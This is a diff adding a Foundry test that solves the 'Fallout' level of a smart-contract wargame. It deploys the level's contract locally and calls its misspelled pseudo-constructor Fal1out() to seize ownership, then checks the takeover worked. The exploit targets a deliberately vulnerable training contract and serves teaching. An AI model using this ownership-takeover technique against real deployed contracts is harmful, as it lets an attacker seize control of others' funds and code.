@@ -1,0 +1,22 @@
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.6.0;
+pragma experimental ABIEncoderV2;
+
+import "../instance/Level2.sol";
+
+import "forge-std/Test.sol";
+
+contract ExploitLevel2 is Test {
+    Fallout instance = new Fallout();
+
+    function setUp() external {
+        // vm.createSelectFork("sepolia");
+    }
+
+    function testExploit() external {
+        vm.broadcast();
+        instance.Fal1out();
+        assertEq(instance.owner(), msg.sender);
+    }
+}
